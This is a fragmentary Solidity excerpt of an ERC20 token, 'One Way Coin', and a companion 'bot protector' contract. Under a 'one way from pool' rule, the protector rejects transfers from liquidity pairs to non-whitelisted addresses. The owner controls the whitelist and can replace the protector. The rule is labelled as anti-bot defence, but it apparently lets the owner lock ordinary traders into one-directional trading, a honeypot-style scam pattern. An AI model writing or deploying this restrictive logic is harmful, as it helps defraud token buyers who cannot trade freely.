...
contract TokenFancyLogic is Ownable{

    address public tokenProtected;//erc20 token protected by this contract
    bool private botProtectionIsActive;
    bool private sandwichProtectionIsActive;
    bool private ganacheDebugMode;
    uint8 public sandwichProtectionTolerance; //detected sandwich block distance. 0 by default. 
    ...
    modifier onlyProtectedToken() {
        require(tokenProtected == _msgSender(), "BotProtector: only protected token can call this function");
        _;
    }

    constructor(address _tokenProtected) public {
        tokenProtected = _tokenProtected;
        sandwichProtectionTolerance = 0;
        botProtectionIsActive = true;
        //bsc miners list
    }

    function setMinerAddress(address _address, bool _flag) external onlyOwner{
        miners[_address] = _flag;
    }
    ...
    function setTokenProtected(address _tokenContract) external onlyOwner{
        require(tokenProtected != _tokenContract, "BotProtector: tokenProtected is the same");
    ...
    function isPotentialBotTransfer(address _from, address _to, uint256 _amount, address _msgsender) external onlyProtectedToken returns (bool){
        ...
        //one way from pool:
        if (isPairAddress[_from] && !botWhitelist[_to]) return true;
...
contract OneWayCoin is ERC20Pausable, AccessControl {

    address private tokenProtector;

    constructor() 
    ERC20("One Way Coin", "OWC") {
    ...
    function setBotProtector(address _botProtector) onlyAdmin public{
        tokenProtector = _botProtector;
    }

    //internal functions
    function _transfer(address sender, address recipient, uint256 amount) internal override {
        if(tokenProtector != address(0)){
            require(!TokenFancyLogic(tokenProtector).isPotentialBotTransfer( sender,  recipient,  amount,  _msgSender()), "OneWayCoin: Bot transaction debounced");
        }
